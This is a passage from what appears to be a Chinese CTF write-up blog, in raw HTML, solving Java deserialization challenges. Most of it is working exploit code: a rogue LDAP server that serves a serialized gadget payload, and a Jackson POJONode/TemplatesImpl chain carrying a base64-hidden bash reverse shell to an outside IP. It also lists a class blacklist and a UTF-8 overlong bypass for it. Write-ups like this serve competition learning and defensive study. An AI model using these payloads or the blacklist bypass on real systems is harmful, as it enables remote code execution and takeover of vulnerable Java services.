src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375546-f15e6ffb-b51c-4628-8344-60cf1c0317bd.png#averageHue=%23212326&clientId=u3af23d66-84b5-4&from=paste&id=u0664fc41&originHeight=824&originWidth=2270&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uaa12b1af-4514-4344-a831-ec8ad2f24ca&title="><br>那么就会进入c_lookup请求，进入c_lookup请求后<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375542-197223ef-bc3a-4e1d-bf91-632b61bf1765.png#averageHue=%232b3d44&clientId=u3af23d66-84b5-4&from=paste&id=u9d54a51f&originHeight=316&originWidth=1874&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0a7a1894-be6e-46d9-a20d-b8309407f08&title="><br>你就会看见熟悉的decodeObject了。这里可以进行反序列化。<br>而我们想进入c_resolveIntermediate_nns也很简单，Head或者Tail不为空即可，我们随便给searchBase加上个前缀。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376164-7b75cf34-fab3-42af-b4f1-748e296e0a3c.png#averageHue=%23bbd3cc&clientId=u3af23d66-84b5-4&from=paste&id=ucccb11a2&originHeight=360&originWidth=1646&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u89fb6532-3a71-44fc-b2e6-cb59909c23b&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376255-25e53185-6bc4-45ed-a99d-fefe59307975.png#averageHue=%23292b30&clientId=u3af23d66-84b5-4&from=paste&id=u99d0e3c4&originHeight=1366&originWidth=2934&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u77889cda-0bdc-4c34-8388-237f5730a16&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376328-34d3a2c4-dbfd-4cd3-a650-85a524a24cec.png#averageHue=%232a2d32&clientId=u3af23d66-84b5-4&from=paste&id=u99af59db&originHeight=1524&originWidth=2948&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u675f8269-9351-4d0f-9f74-16cceea5192&title="><br>最终进行反序列化了，然后就使用POJONODE打一个RCE的gadget就行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserLdapRefServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lanuchLDAPServer</span><span class="params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                ldap_port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://&quot;</span>+http_server+<span class="string">&quot;:&quot;</span>+http_port+<span class="string">&quot;/#org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + ldap_port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;javax.sql.DataSource&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//          </span></span><br><span class="line">            <span class="comment">/** Payload1 end **/</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/** Payload2: Return Serialized Gadget **/</span></span><br><span class="line"><span class="comment">//            try &#123;</span></span><br><span class="line">                <span class="comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;|base64</span></span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAKnQAKWNvbS5qYXZhc2VjLnBvY3MuamFja3Nvbi5CQVRlbXBsYXRlc0NoYWludAAVQkFUZW1wbGF0ZXNDaGFpbi5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAANaAA1lcXVhbHNEZWZpbmVkWgAPaGFzaENvZGVEZWZpbmVkTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7eHAAAHNyADBvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuQWR2aXNlZFN1cHBvcnQky4o8+qTFdQIABloAC3ByZUZpbHRlcmVkWwAMYWR2aXNvckFycmF5dAAiW0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9BZHZpc29yO0wAE2Fkdmlzb3JDaGFpbkZhY3Rvcnl0ADdMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0Fkdmlzb3JDaGFpbkZhY3Rvcnk7TAAIYWR2aXNvcnNxAH4AB0wACmludGVyZmFjZXNxAH4AB0wADHRhcmdldFNvdXJjZXQAJkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9UYXJnZXRTb3VyY2U7eHIALW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5Qcm94eUNvbmZpZ4tL8+an4PdvAgAFWgALZXhwb3NlUHJveHlaAAZmcm96ZW5aAAZvcGFxdWVaAAhvcHRpbWl6ZVoAEHByb3h5VGFyZ2V0Q2xhc3N4cAAAAAAAAHVyACJbTG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLkFkdmlzb3I734MNrdIehHQCAAB4cAAAAABzcgA8b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkRlZmF1bHRBZHZpc29yQ2hhaW5GYWN0b3J5VN1kN+JOcfcCAAB4cHNyABRqYXZhLnV0aWwuTGlua2VkTGlzdAwpU11KYIgiAwAAeHB3BAAAAAB4c3EAfgAUAAAAAHcEAAAAAHhzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AudGFyZ2V0LlNpbmdsZXRvblRhcmdldFNvdXJjZX1VbvXH+Pq6AgABTAAGdGFyZ2V0cQB+AAF4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABxsr+ur4AAAAxABkBAAVLVmlZawcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlBwADDAAFAAYKAAgACQEAEWphdmEvbGFuZy9SdW50aW1lBwALAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADQAOCgAMAA8BAGliYXNoIC1jIHtlY2hvLFltRnphQ0F0WXlBaVltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDODRMakV6TUM0eU5DNHhPRGd2TnpjM09DQThKakVpfXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IABEBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAATABQKAAwAFQEAClNvdXJjZUZpbGUBAApLVmlZay5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAq4ABASErYAFlexAAAAAAABABcAAAACABhwdAAIYm9vZ2lwb3BwdwEAeA==&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//            &#125; catch (ParseException e1) &#123;</span></span><br><span class="line"><span class="comment">//                e1.printStackTrace();</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="comment">/** Payload2 end **/</span></span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerAddress: &quot;+args[0]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerPort: &quot;+args[1]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;LDAPServerPort: &quot;+args[2]);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">http_server_ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ldap_port</span> <span class="operator">=</span> <span class="number">8088</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">http_server_port</span> <span class="operator">=</span> <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);</span><br><span class="line">        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376345-8fc0c4d2-0c5a-4702-99b7-1268722ff364.png#averageHue=%232c2e3a&clientId=u3af23d66-84b5-4&from=paste&id=u5c454f9a&originHeight=1672&originWidth=2632&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u4f908b8b-063c-4a86-a6d2-bde2d238dfd&title="></p><h1 id="JQCTF"><a href="#JQCTF" class="headerlink" title="JQCTF"></a>JQCTF</h1><h2 id="ezjvav"><a href="#ezjvav" class="headerlink" title="ezjvav"></a>ezjvav</h2><p>admin&#x2F;admin 正常登录<br>访问source<br>提示不是jsrc用户，猜了一下 jsrc是 jwt key 就没有然后了<br>黑名单如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 弱黑名单 通过bytes比较</span><br><span class="line">java.util.HashMap</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">com.alibaba.fastjson.JSONArrayLlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">javax.management.BadAttributeValueExpException</span><br><span class="line">com.sun.syndication.feed.impl.ToStringBean</span><br><span class="line">java.security.SignedObject</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>弱黑名单可以用utf-8-overlong直接绕过，墙黑名单ban了和没ban一样的，没啥区别，直接打jackson的pojonode就行了。exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstringTemplateChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        SerializeUtils.OverideJackson();</span><br><span class="line"><span class="comment">//        Templates templates = SerializeUtils.getTemplateByclass(&quot;/Applications/CTFLearning/JavaSec/target/production/JavaSec/com/javasec/memshell/HW/IndexController.class&quot;);</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> SerializeUtils.getTemplate(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3OCA8JjEi&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"><span class="comment">//        JSONObject jsonObject = new JSONObject();</span></span><br><span class="line"><span class="comment">//        jsonObject.put(&quot;poc&quot;,templates);</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jsonNodes);</span><br><span class="line">        <span class="comment">// 执行序列化与反序列化，并且返回序列化数据</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = SerializeUtils.makeMap(h1, h2);</span><br><span class="line">        System.out.println(base64serial(map));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">CustomObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734445120-aa4f213c-1fc7-46d8-b148-d90d36cc0f59.png#averageHue=%23a8a8a8&clientId=u3af23d66-84b5-4&from=paste&id=u0cd271f9&originHeight=1980&originWidth=3148&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ud4974ecc-be22-4cea-9dcf-9ac71b9085d&title="><br>直接sudo读flag就行了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734445205-c5f73037-ff69-4366-a9d1-df2fca4c74b6.png#averageHue=%232c2e3a&clientId=u3af23d66-84b5-4&from=paste&id=HWgpJ&originHeight=1672&originWidth=2632&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uf7d38fd8-1545-4526-a349-7e07aaa4a30&title="></p><h2 id="ezldap"><a href="#ezldap" class="headerlink" title="ezldap"></a>ezldap</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716734494240-710b60a5-9216-496b-9755-1e9a4d36d84b.jpeg#averageHue=%23f6f6f6&clientId=u3af23d66-84b5-4&from=paste&id=u3eff792f&originHeight=388&originWidth=1083&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ub6107ecf-e7f2-43e8-a549-b6159addbeb&title="><br>actuator 接口泄露</p><figure class="highlight 